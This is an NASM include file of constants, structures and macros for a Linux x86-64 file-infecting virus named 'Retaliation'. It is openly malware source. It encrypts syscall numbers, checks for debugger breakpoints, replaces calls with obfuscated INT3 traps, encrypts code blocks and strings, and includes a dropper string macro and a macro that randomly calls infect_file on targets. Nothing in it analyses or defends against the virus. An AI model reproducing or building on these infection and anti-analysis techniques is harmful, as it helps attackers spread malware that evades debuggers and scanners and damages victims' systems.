;-[retaliation.inc]-----------------------------------------------------------
; Constants, Strucs, Macros for Retaliation virus.

;-[UNIX Time Related Macros]--------------------------------------------------
%define MINUITES(s) (s * 60)
%define DAYS(s) (s * 60 * 60 * 24)

;-[Features Defined Constants]------------------------------------------------
%define	RETAL_DISABLED		0x1BADBABE
%define RETAL_ENABLED		0x1BADD00D

;-[Virus Status Constants]----------------------------------------------------
%define VIRUS_INITIALISED	0x1BADDEED
%define VIRUS_TERMINATED	0x1BAD5EED

;-[INT3 CALL Constants]-------------------------------------------------------
%define	INT3_ADDR_MASK		0xF242

;-[Misc Macros]---------------------------------------------------------------
%define bit(x)			(1 << x)

;-[Misc Constants]------------------------------------------------------------
%define RDA_HIGH_BYTE		0x7F

%define	PAGE_SIZE		(2048 * 1024) ;4096

%define	NEWLINE			0x0A

%define MALLOC_EXTRA_SIZE	32768	; Extra space to allocate with malloc_extra

%define	MAX_PHDR_COUNT		16
%define	MAX_SHDR_COUNT		64

%define MAX_FUNC_SYM_COUNT	64

%assign RAND_FLAGS_MASK		(bit(0)\
				|bit(2)\
				|bit(6)\
				|bit(7)\
				|bit(11))

%define	O_TEXT_MARKER		"TSM!"

;-[EBLOCK Constants]----------------------------------------------------------
%define	MAX_EBLOCK_DEPTH	64

%define	ENTER_EBLOCK_OPCODE	0x27
%define EXIT_EBLOCK_OPCODE	0x2F

;-[CRC32 Polynomial Constant]-------------------------------------------------
%define CRC32_POLY		0xEDB88320

;-[BTEA Encryption Constants]-------------------------------------------------
%define	BTEA_DELTA		0x9e3779b9

;-[prolog patch Constants]----------------------------------------------------
%define	PROLOG_PATCH_1		0xE5894855

%define CMP_RAX_PATCH		0xFFF88348


;-[lFSR_POLY Constant]--------------------------------------------------------
%assign LFSR_POLY	(1\
		|	(1 << 1)\
		|	(1 << 2)\
		|	(1 << 4)\
		|	(1 << 6)\
		|	(1 << 31))

;-[_syscall_al]---------------------------------------------------------------
; from __syscall_al:
;		xor	al,0x55		; Decrypt AL
;		rol	al,3

%macro _syscall_al 1
	mov	al,(((%1 >> 3) | (%1 << 5)) ^ 0x55) & 0xFF
	call	__syscall_al
	%assign SYSCALL_COUNT SYSCALL_COUNT + 1
%endmacro

;-[_syscall_ax]---------------------------------------------------------------
; from __syscall_al:
;		xor	al,0x55		; Decrypt AL
;		rol	al,3

%macro _syscall_ax 1
%assign _sal %1 & 0xFF
	mov	ax,((((_sal >> 3) | (_sal << 5)) ^ 0x55) & 0xFF) | (%1 & 0xFF00)
	call	__syscall_ax
	%assign SYSCALL_COUNT SYSCALL_COUNT + 1
%endmacro

;-[bp_syscall_al]-------------------------------------------------------------
%macro bp_syscall_al 1
	%assign SYSCALL_COUNT SYSCALL_COUNT + 1
	%if RETAL_BP_SYSCALLS == RETAL_ENABLED
		db	0xF1
		db	-(((%1 >> 3) | (%1 << 5)) ^ 0x55) & 0xFF
		%assign BP_SYSCALL_COUNT BP_SYSCALL_COUNT + 1
	%else
		_syscall_al %1
	%endif
%endmacro

;-[ADD_FUNCTION]--------------------------------------------------------------
; Increment function count.
%macro ADD_FUNCTION 0
	%assign FUNC_COUNT FUNC_COUNT + 1
%endmacro

;-[CHECK_BREAKPOINT]----------------------------------------------------------
; Check for breakpoint before function return.
%macro CHECK_BREAKPOINT 0
	%if RETAL_BREAKPOINT_CHECK == RETAL_ENABLED
		%assign BP_CHECK_COUNT BP_CHECK_COUNT + 1
		pushf
		call	check_breakpoint
		popf
	%endif
%endmacro
;-[String Hash32]-------------------------------------------------------------
%define strhash32_mul 37

%macro lstrhash32 1
	[list -]
	%defstr mhash32_str %1
	%strlen mhash32_len mhash32_str
	%assign mhash32_index 1
	%assign strhash32_val 0
	%rep mhash32_len
		%substr mhash32_c mhash32_str mhash32_index
		%assign strhash32_val ((strhash32_val * strhash32_mul) + (mhash32_c & 0xFF)) & 0xFFFFFFFF
		%assign mhash32_index mhash32_index + 1
	%endrep
	[list +]

%endmacro

;-[NEG Encrypted Strings]-----------------------------------------------------
%macro negstr 1
	[list -]
	%strlen neg_len %1
	%assign neg_index 1
	%rep neg_len
		%substr neg_c %1 neg_index
		db	0 - (neg_c)
		%assign neg_index neg_index + 1
	%endrep
	db	0 - NEWLINE
	[list +]

%endmacro

;-[XOR $ Encrypted Strings]---------------------------------------------------
%macro ds_str 1
	[list -]
	%strlen ds_len %1
	%assign ds_index 1
	%rep ds_len
		%substr ds_c %1 ds_index
		db	ds_c ^ '$'
		%assign ds_index ds_index + 1
	%endrep
	db	'$'
	[list +]

%endmacro

;-[Dropper Host String]-------------------------------------------------------
%macro hString 1
	%strlen hstrlen %1
	dw	hstrlen
	[list -]
	db	%1
	[list +]
%endmacro

;-[VIRUS_DEBUG_STRING]---------------------------------------------------------
%macro VIRUS_DEBUG_STRING 1
%if RETAL_VIRUS_DEBUG == RETAL_ENABLED
	%defstr debug_str %1
	%strlen debug_str_len debug_str
	call	print_debug_string
	dw	debug_str_len+1
	db	debug_str
	db	NEWLINE
%endif
%endmacro

;-[POLY_DEBUG_STRING]---------------------------------------------------------
%macro POLY_DEBUG_STRING 1
%if RETAL_POLY_DEBUG == RETAL_ENABLED
	%defstr debug_str %1
	%strlen debug_str_len debug_str
	call	print_debug_string
	dw	debug_str_len+1
	db	debug_str
	db	NEWLINE
%endif
%endmacro

;-[POLY_DEBUG_RDI_R13]--------------------------------------------------------
%macro POLY_DEBUG_RDI_R13 0
%if RETAL_POLY_DEBUG_RDI_R13 == RETAL_ENABLED
	call	print_rdi_r13
%endif
%endm

;-[multipush/multipop macros]-------------------------------------------------
; Not written by me.. taken off the net.
%macro  multipush 1-*
    %rep %0
        push %1
        %rotate 1
    %endrep
%endmacro

%macro  multipop 1-*
    %rep %0
        %rotate -1
        pop %1
    %endrep
%endmacro

;-[MALLOC_HANDLE]-------------------------------------------------------------
; Used for malloc, free, garbage collection.
struc	MALLOC_HANDLE
	.size	resd	1
	.addr	resq	1
endstruc

;-[PUSHA_STACK]---------------------------------------------------------------
; Stack after _PUSHA
; multipush rax,rbx,rcx,rdx,rbp,rsi,rdi,r8,r9,r10,r11,r12,r13,r14,r15
struc	PUSHA_STACK
	.r15	resq	1
	.r14	resq	1
	.r13	resq	1
	.r12	resq	1
	.r11	resq	1
	.r10	resq	1
	.r9	resq	1
	.r8	resq	1
	.rdi	resq	1
	.rsi	resq	1
	.rbp	resq	1
	.rdx	resq	1
	.rcx	resq	1
	.rbx	resq	1
	.rax	resq	1
	.rflags	resq	1
endstruc

;-[EBLOCK_HANDLE]-------------------------------------------------------------
; Entries, Size, Key of Encrypted Block
struc	EBLOCK_HANDLE
	.entry_count	resb	1
	.key		resd	1
	.size		resw	1
endstruc

;-[BEGIN_EBLOCK]--------------------------------------------------------------
; Begin Encrypted Block.
%macro	BEGIN_EBLOCK 0
%if RETAL_EBLOCKS == RETAL_ENABLED
	[list -]
	%push	CTX_EBLOCK
	call	enter_eblock
 	%$EBEGIN:
 	db	1	; entry count
 	dd	0	; key
 	dw	(%$EEND - %$EBEGIN) - EBLOCK_HANDLE_size ; size
 	[section .data]
 	dq	%$EBEGIN
	__SECT__
	[list +]
%endif
%endmacro

;-[END_EBLOCK]----------------------------------------------------------------
; End Encrypted Block.
%macro	END_EBLOCK 0
%if RETAL_EBLOCKS == RETAL_ENABLED
	[list -]
 	call	exit_eblock
 	%$EEND:
 	%pop
	%assign EBLOCK_COUNT EBLOCK_COUNT + 1
	[list +]
%endif
%endmacro

;-[BEGIN_EBLOCK_OPCODE]-------------------------------------------------------
; Begin Encrypted Block using invalid opcode
%macro	BEGIN_EBLOCK_OPCODE 0
%if RETAL_EBLOCKS == RETAL_ENABLED
	[list -]
	%push	CTX_EBLOCK
	%if RETAL_EBLOCK_OPCODE == RETAL_ENABLED
		db	ENTER_EBLOCK_OPCODE
	%else
		call	enter_eblock
	%endif
 	%$EBEGIN:
 	db	1	; entry count
 	dd	0	; key
 	dw	(%$EEND - %$EBEGIN) - EBLOCK_HANDLE_size ; size
 	[section .data]
 	dq	%$EBEGIN
	__SECT__
	[list +]
%endif
%endmacro

;-[END_EBLOCK_OPCODE]---------------------------------------------------------
; End Encrypted Block.
%macro	END_EBLOCK_OPCODE 0
%if RETAL_EBLOCKS == RETAL_ENABLED
	[list -]
	%if RETAL_EBLOCK_OPCODE == RETAL_ENABLED
	 	db	EXIT_EBLOCK_OPCODE
	 	%assign EBLOCK_OPCODE_COUNT EBLOCK_OPCODE_COUNT + 1
	%else
		call	exit_eblock
	%endif
 	%$EEND:
 	%pop
	%assign EBLOCK_COUNT EBLOCK_COUNT + 1
	[list +]
%endif
%endmacro


;-[da_file]--------------------------------------------------------------------
; call infect_file on argument with 50% chance of infection
%macro	da_file 1
	INT3_CALL rand_prob
	jpe	%%none
	call	decrypt_DA
		ds_str %1
  	INT3_CALL infect_file
  %%none:
%endmacro

;-[INT3_CALL]------------------------------------------------------------------
; call subroutine using INT3 + imm16
%macro	INT3_CALL 1
	%if RETAL_INT3_CALLS == RETAL_ENABLED
		%assign INT3_CALL_COUNT INT3_CALL_COUNT + 1
		db	0xCC
		dw	((%1 - %%base) & 0xFFFF) ^ INT3_ADDR_MASK
	%%base:
	%else
		call %1
	%endif
%endmacro
